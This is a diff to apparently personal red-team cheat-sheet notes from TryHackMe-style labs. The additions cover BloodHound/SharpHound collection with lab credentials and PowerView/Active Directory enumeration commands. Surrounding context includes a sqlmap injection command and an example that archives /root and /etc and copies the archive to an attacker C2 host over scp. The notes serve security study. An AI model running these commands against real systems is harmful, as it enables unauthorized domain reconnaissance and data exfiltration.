@@ -165,6 +165,24 @@ tar czf dump.tar.gz /root /etc/                       # Archiving sensitive data
 scp dump.tar.gz attacker@c2-server.thm:~              # Exfiltrating the data
 ```
 # Red
+## SHarphound BLoodhound
+### bloodhound.py
+Sharphound data collector meant for linux
+```
+bloodhound-python -u asrepuser1 -p qwerty123! -d tryhackme.loc -ns 10.211.12.10 -c All --zip
+```
+### Bloodhound
+GRAPH!! Host it
+https://happycamper84.medium.com/howto-setup-bloodhound-map-ad-44c7149ba28b
+```
+sudo neo4j start
+sudo neo4j stop
+```
+http://localhost:7474  
+Login, default user neo4j  
+```
+bloodhound
+```
 ## CrackMapExec
 CrackMapExec is a well-known network service exploitation tool that we will use throughout this module. It allows us to perform enumeration, command execution, and post-exploitation attacks in Windows environments. It supports various network protocols, such as SMB, LDAP, RDP, and SSH. If anonymous access is permitted, we can retrieve the password policy without credentials with the following command:
 ```
@@ -255,6 +273,7 @@ Dla bardziej opornych serwerow
 sqlmap -u "http://10.114.131.93/index.php" --data="pma_username=admin&pma_password=password&server=1&target=index.php" --method POST --level 3 --risk 2 --batch --dbs
 ```
 # Red team - WINDOWS
+# AD
 ## Privileges
 **SeImpersonatePrivilege:** As mentioned already, this privilege allows a process to impersonate the security context of another user after authentication. The “potato” attack revolves around abusing this privilege.  
 **SeAssignPrimaryTokenPrivilege:** This privilege permits a process to assign the primary token of another user to a new process. It is used in conjunction with the SeImpersonatePrivilege privilege.  
@@ -295,6 +314,70 @@ You can list/create/run all scheduled tasks using
 schtasks /query
 # /create
 # /run
+```
+## SharpHound and BLoodHound
+SharpHound is the official BloodHound data collector  
+SharpHound.exe: This is a Windows executable designed for standard enumeration on domain-joined Windows machines. Due to its versatility and robust functionality, it is currently the recommended method.  
+AzureHound.ps1: A PowerShell script focused specifically on Azure Entra ID environments. It enables enumerating cloud-specific configurations and identities seamlessly into hybrid AD scenarios.  
+BloodHound.py (Python Collector) - Linux
+```
+\SharpHound.exe --CollectionMethods All --Domain tryhackme.loc --ExcludeDCs
+```
+```
+bloodhound-python -u asrepuser1 -p qwerty123! -d tryhackme.loc -ns 10.211.12.10 -c All --zip
+```
+### Bloodhound graph webapi
+https://happycamper84.medium.com/howto-setup-bloodhound-map-ad-44c7149ba28b
+**Object information** – summary details of the object, such as name, type, and domain
+**Sessions** – active logon sessions associated with the object
+**Member of** – AD groups the object belongs to
+**Local admin privileges** – machines where the object has local administrator rights
+**Execution privileges** – rights such as RDP or equivalent permissions
+**Outbound object control** – rights the object has over other objects
+**Inbound object control** – rights other objects have over this object
+## Powershell 
+https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2025-ps  
+**PowerSploit** - powerful tool for enumeration, discovery etc  
+https://github.com/PowerShellMafia/PowerSploit  
+https://powersploit.readthedocs.io/en/latest/Recon/  
+```
+Import-Module .\PowerView.ps1
+```
+Sprawdzenie modulu AD
+```
+Get-Module -ListAvailable ActiveDirectory
+```
+Module import
+```
+Import-Module ActiveDirectory
+```
+User enumeration
+```
+Get-ADUser -Filter *
+```
+User details
+```
+Get-ADUser -Identity <username> -Properties *
+```
+Looking for interesting accounts
+```
+Get-ADUser -Filter "Name -like '*admin*'"
+```
+Group enumeration
+```
+Get-ADGroup -Filter *
+```
+Group members
+```
+Get-ADGroupMember -Identity "Group Name"
+```
+Computer enumeration
+```
+Get-ADComputer -Filter *
+```
+Default pass policy
+```
+Get-ADDefaultDomainPasswordPolicy
 ```
 ## NET
 Domain info
